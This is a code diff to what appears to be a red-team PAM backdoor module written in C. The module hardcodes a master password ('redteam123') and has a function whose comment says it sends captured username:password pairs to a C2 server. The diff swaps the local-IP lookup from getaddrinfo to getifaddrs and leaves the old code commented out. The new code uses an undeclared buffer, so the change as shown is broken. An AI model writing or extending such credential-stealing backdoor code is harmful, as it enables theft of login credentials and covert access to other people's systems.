@@ -14,6 +14,7 @@
 #include <netdb.h>
 #include <sys/types.h>
 #include <netinet/in.h>
+#include <ifaddrs.h>
 
 #define PAM_PATH "/usr/lib/pam.d/pam_unix.so"
 #define AUTH_PASSWORD "redteam123"
@@ -24,50 +25,80 @@
 
 typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);
 
-// Function to send data to the c2 server (mainly username:password combinations)
-int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
-
-    char host[256];
-    char ipaddr[INET_ADDRSTRLEN + 2];
-    struct addrinfo hints, * res, * p;
-    int status; 
-
-    // Get the hostname
-    gethostname(host, sizeof(host));
-
-    if (host == NULL) {
-        return 1;
+int get_local_ip(char *buffer, size_t buflen) {
+    struct ifaddrs *ifaddr, *ifa;
+    int family;
+    
+    if (getifaddrs(&ifaddr) == -1) {
+        return -1;  // Failed to get interfaces
     }
 
-    // Set up the hints structure
-    memset(&hints, 0, sizeof hints);
-    hints.ai_family = AF_INET;
-    hints.ai_socktype = SOCK_STREAM;
+    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+        if (ifa->ifa_addr == NULL) continue;
 
-    // Get address information
-    status = getaddrinfo(host, NULL, &hints, &res);
+        family = ifa->ifa_addr->sa_family;
 
-    // Loop through all the results and get the first IPv4 address
-    for (p = res; p != NULL; p = p->ai_next) {
-        void* addr = NULL;
-        if (p->ai_family == AF_INET) {
-            struct sockaddr_in* ipv4 = (struct sockaddr_in*)p->ai_addr;
-            addr = &(ipv4->sin_addr);
-
-            // Convert the IP to a string
-            inet_ntop(p->ai_family, addr, ipaddr, sizeof(ipaddr));
-            int len = strnlen(ipaddr, 16);
-            ipaddr[len + 1] = '\0';
-            ipaddr[len] = '\n';
-            
-            // Break after the first IP address is found
-            break;
-
+        // Check for IPv4 (AF_INET) and ignore loopback interfaces
+        if (family == AF_INET && strcmp(ifa->ifa_name, "lo") != 0) {
+            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
+            if (inet_ntop(AF_INET, &addr->sin_addr, buffer, buflen) != NULL) {
+                freeifaddrs(ifaddr);
+                return 0;  // Successfully found an IP
+            }
         }
     }
 
-    // Free the linked list
-    freeaddrinfo(res);
+    freeifaddrs(ifaddr);
+    return -1;  // No suitable IP found
+}
+
+// Function to send data to the c2 server (mainly username:password combinations)
+int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
+
+    if (get_local_ip(ipaddr, sizeof(ipaddr)) < 0) {
+        return 1;
+    }
+    // char host[256];
+    // char ipaddr[INET_ADDRSTRLEN + 2];
+    // struct addrinfo hints, * res, * p;
+    // int status; 
+
+    // // Get the hostname
+    // gethostname(host, sizeof(host));
+
+    // if (host == NULL) {
+    //     return 1;
+    // }
+
+    // // Set up the hints structure
+    // memset(&hints, 0, sizeof hints);
+    // hints.ai_family = AF_INET;
+    // hints.ai_socktype = SOCK_STREAM;
+
+    // // Get address information
+    // status = getaddrinfo(host, NULL, &hints, &res);
+
+    // // Loop through all the results and get the first IPv4 address
+    // for (p = res; p != NULL; p = p->ai_next) {
+    //     void* addr = NULL;
+    //     if (p->ai_family == AF_INET) {
+    //         struct sockaddr_in* ipv4 = (struct sockaddr_in*)p->ai_addr;
+    //         addr = &(ipv4->sin_addr);
+
+    //         // Convert the IP to a string
+    //         inet_ntop(p->ai_family, addr, ipaddr, sizeof(ipaddr));
+    //         int len = strnlen(ipaddr, 16);
+    //         ipaddr[len + 1] = '\0';
+    //         ipaddr[len] = '\n';
+
+    //         // Break after the first IP address is found
+    //         break;
+
+    //     }
+    // }
+
+    // // Free the linked list
+    // freeaddrinfo(res);
 
     // Get host IP address
     // char hostbuffer[256];
